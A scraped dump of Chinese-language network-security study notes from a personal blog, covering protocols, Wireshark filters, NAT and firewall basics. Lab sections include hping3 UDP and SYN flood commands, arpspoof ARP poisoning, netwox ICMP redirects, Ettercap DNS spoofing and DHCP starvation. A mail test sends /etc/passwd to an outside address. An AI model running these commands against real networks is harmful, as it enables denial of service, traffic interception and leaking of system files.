xxxxx:x:0:0:xxxxx:/xxxxx:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/xxxxx:/sbin/nologin -e 多点编辑 1234567891011[root@192 ~]# sed -e &#x27;s/root/xxxx/g&#x27; -e &#x27;1c hellword&#x27; test.txthellwordbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/xxxx:/sbin/nologin 实战监控CPU 123456789101112# 查找消耗CPU超过25%的进程并Killcpu=$(top -n 1 | grep &quot;%Cpu&quot; |awk &#x27;&#123;print $8&#125;&#x27;|awk -F . &#x27;&#123;print $1&#125;&#x27;)if [ $cpu -lt 75 ] ; then pid=$(top -n 1| grep root |head -n 1|awk &#x27;&#123;print $2&#125;&#x27;) echo &quot;占用CPU资源最多的进程ID是&quot;$pid filename=$(ls -l /proc/$pid/exe|awk -F &#x27;-&gt;&#x27; &#x27;&#123;print $2&#125;&#x27;) echo “进程路径为”$filename kill -s 9 $pid if [ $? -eq 0 ] ; then echo &quot;进程已经kill&quot; fifi 邮件配置 软件 mailx 编辑&#x2F;etc&#x2F;mail.rc 加入 1234567891011set from=zwjscu@qq.comset smtp=smtp.qq.comset smtp-auth-user=zwjscu@qq.comset smtp-auth-password=xxxx(授权码) 去对应的邮箱找set smtp-auth=login运行命令mail -s &quot;test&quot; 2194620553@qq.com &lt;/etc/passwd# 失败注意安装sendmailyum install sendmail ​ ​","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Windows防火墙","slug":"Windows防火墙_new","date":"2023-04-04T16:00:00.000Z","updated":"2023-07-22T02:53:56.599Z","comments":true,"path":"2023/04/05/Windows防火墙_new/","link":"","permalink":"http://zwjsfdbb.top/2023/04/05/Windows%E9%98%B2%E7%81%AB%E5%A2%99_new/","excerpt":"windows 防火墙1、包过滤防火墙 判断信息-五元组 工作范围 3-4层 2、应用代理 较大程度地隔绝通信两端的直接通信，所有通信都要由应用层代理层转发,访问者不允许与服务器建立直接的TCP连接，应用层的协议会话过程必须符合代理的安全策略要求。 判断信息：应用层数据 工作范围：应用层 3、状态监测防火墙 ASPF TCP编辑，IP地址，端口 2-4层 4、WAF http协议数据（request response） 应用层","text":"windows 防火墙1、包过滤防火墙 判断信息-五元组 工作范围 3-4层 2、应用代理 较大程度地隔绝通信两端的直接通信，所有通信都要由应用层代理层转发,访问者不允许与服务器建立直接的TCP连接，应用层的协议会话过程必须符合代理的安全策略要求。 判断信息：应用层数据 工作范围：应用层 3、状态监测防火墙 ASPF TCP编辑，IP地址，端口 2-4层 4、WAF http协议数据（request response） 应用层 5、多合一网关 FW IDS IPS AV 2-7 6、下一代防火墙（NGFW） FW IDS IPS AV WAF 7 、windows 防火墙 netsh advfirewall &#x2F;?","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"邮件协议","slug":"邮件协议_new","date":"2023-03-30T16:00:00.000Z","updated":"2023-07-27T14:06:29.173Z","comments":true,"path":"2023/03/31/邮件协议_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/31/%E9%82%AE%E4%BB%B6%E5%8D%8F%E8%AE%AE_new/","excerpt":"邮件协议1、邮件协议 SMTP：简单邮件传输协议，TCP端口号25，主要用于发送电子邮件 SMTP代表Simple Mail Transfer Protocol。SMTP用于发送电子邮件并将其路由到正确的目标服务器（或邮箱）。SMTP服务器提供从邮件客户端（例如Microsoft Outlook、Gmail等）发送电子邮件所需的服务。当你发送一封电子邮件时，SMTP服务器接收该邮件，检查发送者是否有权访问该邮件，并将其传递到邮件接收服务器。SMTP是向外发送电子邮件的标准协议。 POP3：邮局协议第三版，默认TCP端口号110号，主要用于接收电子邮件 POP3是用于从邮件服务器上检索电子邮件的一种协议。使用POP3协议时，用户在邮件客户端上对本地邮件的操作（如，删除、转移至其它文件夹等）不会影响服务器上的邮件。但如果用户未勾选“在服务器上保留邮件的副本”时，不同的邮件客户端看到的本地邮件将会有所不同。 IMAP4：网际消息访问协议第四版，默认端口号143号，主要用于在线查看邮件（接收邮件) 使用IMAP协议时，用户在某个邮件客户端上的操作，将会被“映射”到邮件服务器上。因此，使用IMAP协议，可以同时保持多个邮件客户端上邮件的同步。 2、常见电子邮件系统 exchange postfix 第三方（qq,163） 3、邮件客户端 foxmail outlook 网易邮箱大师 QQ邮箱k 4、wireshark 抓包 可以尝试抓到明文用户名，密码，内容 pop3 : 从邮件服务器拉取邮件，删除后不影响邮件服务器","text":"邮件协议1、邮件协议 SMTP：简单邮件传输协议，TCP端口号25，主要用于发送电子邮件 SMTP代表Simple Mail Transfer Protocol。SMTP用于发送电子邮件并将其路由到正确的目标服务器（或邮箱）。SMTP服务器提供从邮件客户端（例如Microsoft Outlook、Gmail等）发送电子邮件所需的服务。当你发送一封电子邮件时，SMTP服务器接收该邮件，检查发送者是否有权访问该邮件，并将其传递到邮件接收服务器。SMTP是向外发送电子邮件的标准协议。 POP3：邮局协议第三版，默认TCP端口号110号，主要用于接收电子邮件 POP3是用于从邮件服务器上检索电子邮件的一种协议。使用POP3协议时，用户在邮件客户端上对本地邮件的操作（如，删除、转移至其它文件夹等）不会影响服务器上的邮件。但如果用户未勾选“在服务器上保留邮件的副本”时，不同的邮件客户端看到的本地邮件将会有所不同。 IMAP4：网际消息访问协议第四版，默认端口号143号，主要用于在线查看邮件（接收邮件) 使用IMAP协议时，用户在某个邮件客户端上的操作，将会被“映射”到邮件服务器上。因此，使用IMAP协议，可以同时保持多个邮件客户端上邮件的同步。 2、常见电子邮件系统 exchange postfix 第三方（qq,163） 3、邮件客户端 foxmail outlook 网易邮箱大师 QQ邮箱k 4、wireshark 抓包 可以尝试抓到明文用户名，密码，内容 pop3 : 从邮件服务器拉取邮件，删除后不影响邮件服务器 IMAP：删了就是删了","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"HTTP","slug":"HTTP_new","date":"2023-03-28T16:00:00.000Z","updated":"2023-07-22T02:53:56.582Z","comments":true,"path":"2023/03/29/HTTP_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/29/HTTP_new/","excerpt":"HTTP协议-HTTPS1、HTTP 超文本传输协议，默认端口80，基于TCP http是无连接的，限制每次连接只处理一个请求 http是无状态的，没有记忆能力 2、HTTPS https &#x3D; http + ssl&#x2F;tls 在http的通道上增加了安全性，传输过程中通过加密和身份验证来确保传输安全性。 tls 传输层安全协议，SSL和tls其实是一个协议，SSL 2.0版本自SSL3.0版本以后更名为TLS1.0，目前最高TLS1.3，最广泛应用的是TLS1.2。 传输之前，client和server 协商数据传输过程中的加密算法，包含非对称加密的密钥交换算法（RSA），数据签名摘要算法（MD5，sha），对称加密算法（DES&#x2F;AES ） 客户端生成随机的字符串，通过协商好的非对称加密算法，使用服务端的公钥对该字符串进行加密，发送给服务端。服务端收到后，使用自己的私钥进行解密得到该字符串，随后的数据传输中，使用这个字符串作为密钥进行对称加密。 3、PKI 数字签名 4、完整的过程","text":"HTTP协议-HTTPS1、HTTP 超文本传输协议，默认端口80，基于TCP http是无连接的，限制每次连接只处理一个请求 http是无状态的，没有记忆能力 2、HTTPS https &#x3D; http + ssl&#x2F;tls 在http的通道上增加了安全性，传输过程中通过加密和身份验证来确保传输安全性。 tls 传输层安全协议，SSL和tls其实是一个协议，SSL 2.0版本自SSL3.0版本以后更名为TLS1.0，目前最高TLS1.3，最广泛应用的是TLS1.2。 传输之前，client和server 协商数据传输过程中的加密算法，包含非对称加密的密钥交换算法（RSA），数据签名摘要算法（MD5，sha），对称加密算法（DES&#x2F;AES ） 客户端生成随机的字符串，通过协商好的非对称加密算法，使用服务端的公钥对该字符串进行加密，发送给服务端。服务端收到后，使用自己的私钥进行解密得到该字符串，随后的数据传输中，使用这个字符串作为密钥进行对称加密。 3、PKI 数字签名 4、完整的过程","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"FTP","slug":"FTP_new","date":"2023-03-27T16:00:00.000Z","updated":"2023-07-22T02:53:56.582Z","comments":true,"path":"2023/03/28/FTP_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/28/FTP_new/","excerpt":"FTP协议1、概念 文件传输协议，CS架构，基于TCP，默认端口号20，21 主动模式 被动模式 2、软件 服务器软件 serv-U filezilla server vsftpd IIS 客户端 ftp serverIP 资源管理器 ftp://192.168.10.10 浏览器 ftp://server_ip 第三方工具","text":"FTP协议1、概念 文件传输协议，CS架构，基于TCP，默认端口号20，21 主动模式 被动模式 2、软件 服务器软件 serv-U filezilla server vsftpd IIS 客户端 ftp serverIP 资源管理器 ftp://192.168.10.10 浏览器 ftp://server_ip 第三方工具","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DNS","slug":"DNS_new","date":"2023-03-25T16:00:00.000Z","updated":"2023-07-22T02:53:56.580Z","comments":true,"path":"2023/03/26/DNS_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/26/DNS_new/","excerpt":"DNS 协议1、概念 DNS记录 A : 主机记录，域名和IP的映射 CNAME ： 别名 SOA：权威名称服务器 NS：名称服务器 MX：邮件交换记录 SRV： 正在提供服务的 PTR: 反向指针 2、DNS查询 客户机访问www.baidu.com，根据自己的TCP/IP参数，向自己的首选DNS服务器发送DNS请求 首选DNS服务器收到客户机的请求后，去查询自己的区域文件，找不到IP地址信息（将请求转发给根域服务器）；直接可以找到，则返回IP地址 根域服务器收到请求后，由于根域服务器只维护顶级域服务器，会响应顶级域名服务器IP（com）,首选DNS根据根域名服务器响应的信息，将请求转发到com顶级域 com顶级域收到请求，由于com顶级域只维护二级域信息，会响应二级域服务器IP，首选DNS根据顶级域响应的信息，将请求转发到baidu.com 二级域 baidu.com 二级域收到请求，baidu.com DNS服务器里面维护的是baidu.com 区域内的所有主机信息，包含了www.baidu.com的信息，将IP地址响应给首选DNS 首选DNS响应给主机。 3、 DNS配置 缓存DNS服务器 server2016上安装DNS服务，配置转发器 将另一台主机DNS服务器设置为server2016的IP，随后nslookup 查询特定域名 wireshark抓包 server2016这个缓存DNS服务器向转发器中的DNS服务器（192.168.10.1）转发DNS请求，192.168.10.1请求到以后，返回给server2016，server2016再响应client。 4、 DNS攻击 环境：","text":"DNS 协议1、概念 DNS记录 A : 主机记录，域名和IP的映射 CNAME ： 别名 SOA：权威名称服务器 NS：名称服务器 MX：邮件交换记录 SRV： 正在提供服务的 PTR: 反向指针 2、DNS查询 客户机访问www.baidu.com，根据自己的TCP/IP参数，向自己的首选DNS服务器发送DNS请求 首选DNS服务器收到客户机的请求后，去查询自己的区域文件，找不到IP地址信息（将请求转发给根域服务器）；直接可以找到，则返回IP地址 根域服务器收到请求后，由于根域服务器只维护顶级域服务器，会响应顶级域名服务器IP（com）,首选DNS根据根域名服务器响应的信息，将请求转发到com顶级域 com顶级域收到请求，由于com顶级域只维护二级域信息，会响应二级域服务器IP，首选DNS根据顶级域响应的信息，将请求转发到baidu.com 二级域 baidu.com 二级域收到请求，baidu.com DNS服务器里面维护的是baidu.com 区域内的所有主机信息，包含了www.baidu.com的信息，将IP地址响应给首选DNS 首选DNS响应给主机。 3、 DNS配置 缓存DNS服务器 server2016上安装DNS服务，配置转发器 将另一台主机DNS服务器设置为server2016的IP，随后nslookup 查询特定域名 wireshark抓包 server2016这个缓存DNS服务器向转发器中的DNS服务器（192.168.10.1）转发DNS请求，192.168.10.1请求到以后，返回给server2016，server2016再响应client。 4、 DNS攻击 环境： kali 192.168.101.8 攻击机器 server2016 web服务器 192.168.101.6 提供web界面 win10 192.168.101.11 被攻击的主机 工具 Ettercap 修改&#x2F;etc&#x2F;ettercap&#x2F;etter.dns 格式 要欺骗的域名 A + 目标IP 配置Ettercap，打开后扫描主机进行arp欺骗 选择目标主机以及网关add to Target，随后点击ARP poisoning , 随后选择dns_spoof 进行欺骗。 最后在目标主机访问woniu.com 被修改成了192.168.101.6 的web页面。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DHCP","slug":"DHCP_new","date":"2023-03-22T16:00:00.000Z","updated":"2023-07-22T02:53:56.579Z","comments":true,"path":"2023/03/23/DHCP_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/23/DHCP_new/","excerpt":"DHCP协议1、DHCP的工作原理 动态主机配置协议，主要给客户机提供TCP&#x2F;IP参数（IP地址、子网掩码、网关、DNS） 好处 减少管理员的工作量 减少出错的可能，避免输入错误 避免IIP冲突 提高IP地址利用 应用层协议，基于UDP，端口号67，服务器响应给客户机的68号端口，客户机与服务器的交互过程 dhcp discover 客户机 发送 ，以广播方式，网络中所有的DHCP服务器都会受到并响应 ，客户向受到的第一个offer报文的服务器发送request请求 dhcp offer dhcp 服务器发送的提供报文 dhcp request client 发送的request请求 dhcp ack 服务器确认，客户机获得IP参数 除了以上的还有四种报文 dhcp release dhcp nak: 针对request 的拒绝报文 dhcp decline：当客户端发现接收到IP冲突时，发送此报文给服务器 dhcp inform：已经有IP地址，获取其他的配置信息，如网关，DNS等 2、windows server 部署 如图的拓扑结构，R1上需要在f0&#x2F;0接口配置dhcp中继，VM1才能请求到DHCPserver 分配的IP地址。 如图 DHCP server 配置了两个dhcp 作用域，50和120网段 3、抓流量 示例1，释放vmnet1 的地址来抓包，查看这个过程 12ipconfig /release &quot;VMware Network Adapter VMnet1&quot;ipconfig /renew &quot;VMware Network Adapter VMnet1&quot;","text":"DHCP协议1、DHCP的工作原理 动态主机配置协议，主要给客户机提供TCP&#x2F;IP参数（IP地址、子网掩码、网关、DNS） 好处 减少管理员的工作量 减少出错的可能，避免输入错误 避免IIP冲突 提高IP地址利用 应用层协议，基于UDP，端口号67，服务器响应给客户机的68号端口，客户机与服务器的交互过程 dhcp discover 客户机 发送 ，以广播方式，网络中所有的DHCP服务器都会受到并响应 ，客户向受到的第一个offer报文的服务器发送request请求 dhcp offer dhcp 服务器发送的提供报文 dhcp request client 发送的request请求 dhcp ack 服务器确认，客户机获得IP参数 除了以上的还有四种报文 dhcp release dhcp nak: 针对request 的拒绝报文 dhcp decline：当客户端发现接收到IP冲突时，发送此报文给服务器 dhcp inform：已经有IP地址，获取其他的配置信息，如网关，DNS等 2、windows server 部署 如图的拓扑结构，R1上需要在f0&#x2F;0接口配置dhcp中继，VM1才能请求到DHCPserver 分配的IP地址。 如图 DHCP server 配置了两个dhcp 作用域，50和120网段 3、抓流量 示例1，释放vmnet1 的地址来抓包，查看这个过程 12ipconfig /release &quot;VMware Network Adapter VMnet1&quot;ipconfig /renew &quot;VMware Network Adapter VMnet1&quot; client获取IP地址是一直在发广播报文： dhcp server 则是发的单播报文 4、 DHCP欺骗 攻击DHCP，发送discover 报文使得DHCP服务器的IP被耗尽，从而无法提供服务。 使用的工具是 yersinia, 可以攻击DHCP服务器使得IP被耗尽，随后伪造一个DHCP服务器。 攻击的拓扑结构 5、DHCP防御 在交换机上配置信任端口 开启DHCP监听 1ip dhcp snooping 指定监听vlan 1ip dhcp snooping vlan1 由于开启监听后，交换机上的所有端口都变成非信任端口，会拒绝所有DHCP报文，需要将正常的接口配置为信任端口 12int f0/1ip dhcp snooping trust","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"UDP","slug":"UDP_new","date":"2023-03-22T16:00:00.000Z","updated":"2023-07-22T02:53:56.593Z","comments":true,"path":"2023/03/23/UDP_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/23/UDP_new/","excerpt":"UDP协议 特点 不需要连接，直接发送数据，不会重新排序，也不需要确认 报文字段 源端口 目的端口 length checksum stream index timestamps udp payload 常见UDP DNS 53 ntp 123 tftp 69 rpc 111 snmp 161 udp 攻击 1hping3 -q -n --rand-source --udp -p 53 --flood 192.168.198.135 -d 10000","text":"UDP协议 特点 不需要连接，直接发送数据，不会重新排序，也不需要确认 报文字段 源端口 目的端口 length checksum stream index timestamps udp payload 常见UDP DNS 53 ntp 123 tftp 69 rpc 111 snmp 161 udp 攻击 1hping3 -q -n --rand-source --udp -p 53 --flood 192.168.198.135 -d 10000","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"tcp","slug":"tcp_new","date":"2023-03-22T16:00:00.000Z","updated":"2023-07-22T02:53:56.591Z","comments":true,"path":"2023/03/23/tcp_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/23/tcp_new/","excerpt":"TCP协议 tcp字段 三次握手 wireshark 抓包情况如下，第一次SYN&#x3D;1 seq&#x3D;391720034, 第二次SYN&#x3D;1 ACK&#x3D;1 seq &#x3D; 3010721076 ack&#x3D; 391720035, 第三次 ACK&#x3D;1, seq&#x3D;391720035 ack &#x3D; 3010721077, 第二次的seq是一个随机数，ack&#x3D;第一次seq+1, 第三次的seq&#x3D;第二次的ack，ack&#x3D; 第二次的seq+1 四次挥手 tcp 半关闭状态 tcp半连接状态 客户端syn，服务器syn, ack ,客户端不继续ack syn flood Ddos 1hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.198.135 ddos 防御 tcp代理 tcp源探测 回复伪造的syn+ack，然后如果client 发送RST，则说明是正常的包放行 TCP连接数量限制","text":"TCP协议 tcp字段 三次握手 wireshark 抓包情况如下，第一次SYN&#x3D;1 seq&#x3D;391720034, 第二次SYN&#x3D;1 ACK&#x3D;1 seq &#x3D; 3010721076 ack&#x3D; 391720035, 第三次 ACK&#x3D;1, seq&#x3D;391720035 ack &#x3D; 3010721077, 第二次的seq是一个随机数，ack&#x3D;第一次seq+1, 第三次的seq&#x3D;第二次的ack，ack&#x3D; 第二次的seq+1 四次挥手 tcp 半关闭状态 tcp半连接状态 客户端syn，服务器syn, ack ,客户端不继续ack syn flood Ddos 1hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.198.135 ddos 防御 tcp代理 tcp源探测 回复伪造的syn+ack，然后如果client 发送RST，则说明是正常的包放行 TCP连接数量限制","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"ICMP协议","slug":"ICMP协议_new","date":"2023-03-19T16:00:00.000Z","updated":"2023-07-22T02:53:56.583Z","comments":true,"path":"2023/03/20/ICMP协议_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/20/ICMP%E5%8D%8F%E8%AE%AE_new/","excerpt":"ICMP协议1、理解ICMP协议 Internet 控制报文协议，用于在IP主机、路由器之间传输控制信息，控制消息指的是网络通不通，主机是否可达，路由是否可用等。 ICMP基本概念 网络层协议，封装在网络层和传输层之间 2、理解ICMP重定向 在某些特定情况下，路由器检测到主机使用非优化路由时候，会向主机发送一个ICMP重定向的报文，使得主机的路由改变。 重定向攻击 kali上使用工具实施ICMP重定向网关 1netwox 86 -g 192.168.198.128 # 把网络中的网关修改为192.168.198.128 3、会使用wireshark分析ICMP重定向 实验条件 kaili 地址 192.168.198.128 win10地址 192.168.198.134","text":"ICMP协议1、理解ICMP协议 Internet 控制报文协议，用于在IP主机、路由器之间传输控制信息，控制消息指的是网络通不通，主机是否可达，路由是否可用等。 ICMP基本概念 网络层协议，封装在网络层和传输层之间 2、理解ICMP重定向 在某些特定情况下，路由器检测到主机使用非优化路由时候，会向主机发送一个ICMP重定向的报文，使得主机的路由改变。 重定向攻击 kali上使用工具实施ICMP重定向网关 1netwox 86 -g 192.168.198.128 # 把网络中的网关修改为192.168.198.128 3、会使用wireshark分析ICMP重定向 实验条件 kaili 地址 192.168.198.128 win10地址 192.168.198.134 在kali上运行工具netwox ，伪装的网关是 192.168.198.128，随后在win10上ping www.baidu.com，接着wireshark可以看到如下结果：修改了网关地址为 192.168.198.128，但是网关随便修改成功，但是攻击失败，目标仍然可以上网，原因未知。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"arp协议","slug":"arp协议_new","date":"2023-03-19T16:00:00.000Z","updated":"2023-07-22T02:53:56.578Z","comments":true,"path":"2023/03/20/arp协议_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/20/arp%E5%8D%8F%E8%AE%AE_new/","excerpt":"ARP协议一、ARP协议将一个已知的IP地址解析为MAC地址，从而进行二层数据交互，是一个三层的协议，但是工作在二层，是一个2.5层协议。 二、工作流程1、两个阶段 ARP请求 ARP响应 2、arp数据格式 目的MAC地址：源MAC地址：帧的类型：ARP请求（硬件类型：协议类型：硬件地址长度：协议地址长度: Opcode：发送方MAC地址：发送方IP地址：目标MAC地址：目标IP地址 ）","text":"ARP协议一、ARP协议将一个已知的IP地址解析为MAC地址，从而进行二层数据交互，是一个三层的协议，但是工作在二层，是一个2.5层协议。 二、工作流程1、两个阶段 ARP请求 ARP响应 2、arp数据格式 目的MAC地址：源MAC地址：帧的类型：ARP请求（硬件类型：协议类型：硬件地址长度：协议地址长度: Opcode：发送方MAC地址：发送方IP地址：目标MAC地址：目标IP地址 ） 3、arp 缓存 目的是为了防止重复请求 命令 123ARP -a #查看所有IP地址和MAC地址对应 arp -s IP MAC # 静态绑定arp -d # 清除arp 4、ARP攻击以及欺骗 ARP 攻击 禁用网络服务 如下图所示，主机A无法通信 伪造ARP应答报文，向被攻击主机响应虚假的MAC地址 当被攻击主机进行网络通信时，会将数据交给虚假的mac 地址进行转发，由于虚假的MAC地址不存在，造成被攻击主机无法访问网络 ARP欺骗 欺骗网关 伪造arp应答报文，向被攻击主机和网关响应真实的MAC地址 当被攻击主机进行网络通信时，会将数据交给真实MAC地址（C）进行转发给网关，从而来截获被攻击主机的数据，被攻击主机可以进行网络通信 欺骗主机 伪造arp应答报文，向被攻击主机和通信响应真实的MAC地址 当被攻击主机进行网络通信时，会将数据交给真实MAC地址（C），从而来截获被攻击主机的数据，被攻击主机可以进行网络通信 ​ ARP-防御 arp绑定 arp-实验 工具 arpspoof 1apt-get install dsniff 命令 1sudo arpspoof -i eth0 -t 192.168.101.11 192.168.101.1 向目标主机192.168.101.11 发送arp欺骗报文，使得192.168.101.1（网关），192.168.101.5（kali）的MAC地址都是攻击者的MAC地址，但是未开启转发，所以无法访问网络。 开启转发 1echo 1&gt; /proc/sys/net/ipv4/ip_forward 开启以后，网络恢复畅通，实现了arp 欺骗攻击。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"WireShark","slug":"WireShark_new","date":"2023-03-15T16:00:00.000Z","updated":"2023-07-27T14:38:08.170Z","comments":true,"path":"2023/03/16/WireShark_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/16/WireShark_new/","excerpt":"协议 TCP&#x2F;IP 协议族 网络接口层 PPPOE 物理层 数据链路层 网络层：IP ARP RARP ICMP IGMP 传输层 TCP(传输控制协议) UDP（用户数据包协议） 应用层 HTTP FTP DNS DHCP HTTPS SMTP POP IMAP 0-65535 0-1023 WireShark 流量抓取工具一、网卡 对主机网卡上的数据流量进行抓取 1、网卡模式 混杂模式 设置为混杂模式才可以抓取 非混杂模式（默认），不会接收目的非自己的数据 2、界面认识 3、过滤器","text":"协议 TCP&#x2F;IP 协议族 网络接口层 PPPOE 物理层 数据链路层 网络层：IP ARP RARP ICMP IGMP 传输层 TCP(传输控制协议) UDP（用户数据包协议） 应用层 HTTP FTP DNS DHCP HTTPS SMTP POP IMAP 0-65535 0-1023 WireShark 流量抓取工具一、网卡 对主机网卡上的数据流量进行抓取 1、网卡模式 混杂模式 设置为混杂模式才可以抓取 非混杂模式（默认），不会接收目的非自己的数据 2、界面认识 3、过滤器 捕获过滤器：抓包之前过滤，只抓某些类型如TCP 显示过滤器：抓取所有类型，查看时只显示特定类型 4 过滤器的语法 捕获过滤器 类型：host net port 方向:src dst 协议: ether ip tcp udp http ftp dns 运算符: &amp;&amp; || ! 示例 抓取源IP 为192.168.18.14 并且目标端口为80 的报文 1src host 192.168.18.14 &amp;&amp; dst port 80 抓取IP 为192.168.18.1 或者192.168.18.14 的报文 1host 192.168.18.14 || host 192.168.18.1 非广播 1！broadcast 抓取源IP 192.168.18.14 或者源IP 192.168.18.0 目的TCP端口 200-1000，位于129.0.0.0&#x2F;8 1(src ip 192.168.18.14 ||src net 192.168.18.0/24) &amp;&amp; (dst portrange 200-1000 &amp;&amp; dst net 129.0.0.0/8) 显示过滤器 语法 比较的操作符： &#x3D;&#x3D; (eq) !&#x3D; (neq) &gt; (gt) &lt; (lt) &gt;&#x3D; (ge) &lt;&#x3D;(le) 逻辑操作符： and &amp;&amp; or || not IP 地址 ip.addr ip.src ip.dst 端口过滤 tcp.port udp.port tcp.dstport tcp.flag.syn 协议过滤： arp ip icmp tcp udp 示例： 显示源IP是 192.168.18.14 并且tcp 端口是443 1ip.src==192.168.18.14&amp;&amp; tcp.port==443 显示源 不为192.168.18.14 或者目的不为202.98.96.68 1ip.src!=192.168.18.14 || ip.dst!=202.98.96.68 案例 查找www.jd.com 的dns解析以及http 通信报文","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"NAT","slug":"NAT_new","date":"2023-03-14T16:00:00.000Z","updated":"2023-07-22T02:53:56.588Z","comments":true,"path":"2023/03/15/NAT_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/15/NAT_new/","excerpt":"一、NAT基本概念 将私网IP地址转换为公网IP地址 1、转换方式 静态转换 仅针对IP地址转换 1对1 1ip nat inside source static 192.168.1.1 64.23.12.34 动态转换 仅针对IP地址转换 多对多(当内网主机多以外网IP个数时，无法实现内网所有主机上网 )，也无法根据外网地址定位内网，所以只能内网访问外网 1234567#定义内网范围access-list 1 permit 192.168.10.0 0.0.0.255#定义外网范围ip nat pool woniu 23.24.56.60 23.24.56.61 netmask 255.255.255.0#应用ip nat inside source list 1 pool woniu 端口多路复用PAT 多对1转，携带端口一起转换 192.168.1.1：8899 —》1.2.3.4：12345，形成的也是动态对应关系，只能内网访问外网 端口多路复用 内网的多个地址转换为外网的一个IP地址（端口一起转换） 1234567#定义内网范围access-list 1 permit any#定义外网范围ip nat pool woniu 23.24.56.60 23.24.56.60 netmask 255.255.255.0#应用ip nat inside source list 1 pool woniu overload 